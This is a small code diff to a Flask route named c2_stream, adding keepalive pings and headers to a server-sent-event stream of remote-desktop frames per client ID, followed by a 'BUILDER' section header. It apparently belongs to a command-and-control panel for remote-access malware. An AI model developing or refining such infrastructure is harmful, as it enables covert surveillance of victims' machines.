@@ -944,7 +944,9 @@ def c2_stream(client_id):
             return jsonify({'error': 'not found'}), 404
 
     def generate():
+        yield ": ping\n\n"
         last_ts = 0
+        ping_counter = 0
         while True:
             with rdp_frames_lock:
                 frame = rdp_frames.get(client_id)
@@ -952,10 +954,21 @@ def c2_stream(client_id):
                 last_ts = frame['ts']
                 b64 = base64.b64encode(frame['data']).decode('ascii')
                 yield f"data:{b64}\n\n"
+                ping_counter = 0
+            else:
+                ping_counter += 1
+                if ping_counter >= 30: # every ~1.5s keepalive ping to force buffer flush
+                    yield ": keepalive\n\n"
+                    ping_counter = 0
             time.sleep(0.05)
 
     return Response(generate(), mimetype='text/event-stream',
-                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
+                    headers={
+                        'Cache-Control': 'no-cache',
+                        'Content-Type': 'text/event-stream',
+                        'X-Accel-Buffering': 'no',
+                        'Connection': 'keep-alive'
+                    })
 
 
 # ===== BUILDER =====
